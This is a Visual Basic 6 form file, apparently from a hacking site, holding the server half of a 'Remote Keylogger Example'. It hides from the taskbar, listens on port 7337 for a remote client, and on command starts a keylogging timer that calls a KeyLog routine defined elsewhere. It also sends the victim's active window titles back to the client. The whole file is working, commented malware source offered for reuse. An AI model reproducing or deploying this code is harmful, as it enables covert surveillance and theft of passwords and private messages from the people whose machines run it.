VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Main 
   BorderStyle     =   0  'None
   ClientHeight    =   495
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   540
   BeginProperty Font 
      Name            =   "Small Fonts"
      Size            =   6.75
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   495
   ScaleWidth      =   540
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox ActiveWin 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Text            =   "txtwin"
      Top             =   600
      Width           =   735
   End
   Begin VB.Timer TmrLog 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   600
      Top             =   840
   End
   Begin MSWinsockLib.Winsock Wsk 
      Left            =   120
      Top             =   840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label LblC 
      Appearance      =   0  'Flat
      BackColor       =   &H000000FF&
      BorderStyle     =   1  'Fixed Single
      ForeColor       =   &H80000008&
      Height          =   495
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   540
   End
End
Attribute VB_Name = "Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' Remote Keylogger Example By Leo
' www.SilentHack.com

Private Sub Form_Load()
On Error Resume Next
 If App.PrevInstance = True Then 'If the servers already open, end.
 End
 End If

 With Wsk
  .Close 'Close any previous connections
  .LocalPort = 7337 'Set the port to listen on ( has to be the same as client )
  .Listen ' Start listening..
 End With
 
End Sub

Private Sub Wsk_Close() 'Connections been closed.
  TmrLog.Enabled = False
    LblC.BackColor = &HFF& 'Change the color or the label to red, for that "Disconnected" effect.
      With Wsk
       .Close 'Close/clear the connection
       .LocalPort = 7337 'Set the port again  ' This is so when the client disconnects, the server is ready to be connected to again.
       .Listen 'Listen again
     End With
End Sub

Private Sub wsk_ConnectionRequest(ByVal requestID As Long) ' This is where the client request's for a connection to the server.
 If Wsk.State <> sckClosed Then Wsk.Close ' Close the socket if it's already open.
  Wsk.Accept requestID ' Accept the connection ( Connect to the client )
   LblC.BackColor = &HFF00& 'Change the color or the label to green, for that "Connected" effect.
End Sub

Private Sub wsk_DataArrival(ByVal bytesTotal As Long) 'The incoming data sent from the client come's here, we will need to check the data in order to make the server do what the client wants.
 Dim Data                                    As String
 Wsk.GetData Data ' Grab the data

If Data = "Start" Then ' If the data is Start, that means the client told the server to start keylogging, so we enable the keylog timer.
 TmrLog.Enabled = True
 Wsk.SendData "ÀSTATUSÀ" & "Server : Keylogging Started!" 'Let the client know we started logging
 
ElseIf Data = "Stop" Then 'Stop keylogging.
 TmrLog.Enabled = False
 Wsk.SendData "ÀSTATUSÀ" & "Server : Keylogging Stopped..." 'Let the client know we stopped logging
 
ElseIf Data = "End" Then 'Byeeee.
 End
 
End If
End Sub

Private Sub ActiveWin_Change()
 On Error Resume Next ' Obviosly we dont want to send the window caption on every pressed key! So we only send it when this text box text changes! (A new window is the active window when a key is pressed)
 Wsk.SendData "ÀWINÀ" & ActiveWin '"ÀWINÀ" is just to identify the data in the client.
 End Sub

Private Sub TmrLog_Timer()
 KeyLog Wsk 'Contiously keylog, (1mm)
End Sub
